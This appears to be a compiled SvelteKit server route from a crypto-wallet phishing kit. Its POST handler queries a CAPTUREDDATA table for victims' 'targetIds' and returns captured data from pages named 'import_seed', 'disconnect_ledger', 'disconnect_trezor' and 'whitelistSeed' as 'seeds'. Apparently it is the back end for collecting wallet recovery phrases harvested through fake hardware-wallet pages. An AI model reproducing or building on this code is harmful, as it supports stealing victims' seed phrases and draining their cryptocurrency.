import { j as json } from './index-DgaSZy_D.js';
import { p as pool } from './config-uUQ8gdZy.js';
import 'pg';
import 'dotenv';

async function POST({ request }) {
  try {
    const { guild, targetIds } = await request.json();
    if (!guild || !targetIds) {
      return json({ success: false, error: "Missing required parameters" }, { status: 400 });
    }
    const query = `
            SELECT targetid, page, captureddata
            FROM CAPTUREDDATA 
            WHERE targetid = ANY($1)
            AND page IN ('import_seed', 'disconnect_ledger', 'disconnect_trezor', 'whitelistSeed')
        `;
    const result = await pool.query(query, [targetIds]);
    return json({
      success: true,
      seeds: result.rows
    });
  } catch (err) {
    console.error("Database error:", err);
    return json({ success: false, error: "Internal server error" }, { status: 500 });
  }
}

export { POST };
//# sourceMappingURL=_server.ts-BYeM69sA.js.map
